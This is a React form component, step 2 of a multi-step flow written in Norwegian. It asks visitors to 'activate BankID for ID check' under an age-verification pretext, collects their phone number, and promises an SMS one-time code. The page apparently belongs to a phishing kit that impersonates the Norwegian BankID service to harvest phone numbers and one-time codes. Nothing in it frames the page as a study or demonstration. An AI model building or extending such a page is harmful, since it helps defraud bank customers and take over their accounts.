import PropTypes from "prop-types";
import { useState } from "react";
import Loader from "../../components/Loader";

const Step2 = ({ formData, handleInputChange, handleNext, isLoading }) => {
  const [error, setError] = useState("");

  const handleNextWithValidation = () => {
    if (formData.step2 && formData.step2.length === 8) {
      setError("");
      handleNext();
    } else {
      setError("det oppstod en feil");
    }
  };
  return (
    <>
      <h1 className="font-bold text-lg pt-8">Aktiver BankID for ID sjekk</h1>
      <p className="text-sm">Aldersgrense indentifisering</p>

      <div className="flex flex-col w-full py-10">
        <label className="pb-2">Skriv ditt telefonnummer</label>
        <input
          type="text"
          className="step-input rounded-md bg-[#481b68] border border-[#745b88] hover:border-white"
          placeholder="Telefonnummer"
          name="step2"
          maxLength={8}
          minLength={8}
          value={formData.step2 || ""}
          onChange={handleInputChange}
        />
        <label className="text-xs text-start pt-1">
          Vi sender deg en tekstmelding med engangskode til dette
        </label>
        {error && <span className="text-red-500 text-sm mt-1">{error}</span>}
      </div>

      <button
        className="bg-white mb-3 text-black px-6 py-2 w-50 rounded-full font-bold"
        onClick={handleNextWithValidation}
        disabled={isLoading || !formData.step2}
      >
        {isLoading ? <Loader /> : "Neste"}
      </button>
    </>
  );
};

Step2.propTypes = {
  formData: PropTypes.object.isRequired,
  handleInputChange: PropTypes.func.isRequired,
  handleNext: PropTypes.func.isRequired,
  isLoading: PropTypes.bool.isRequired
};

export default Step2;
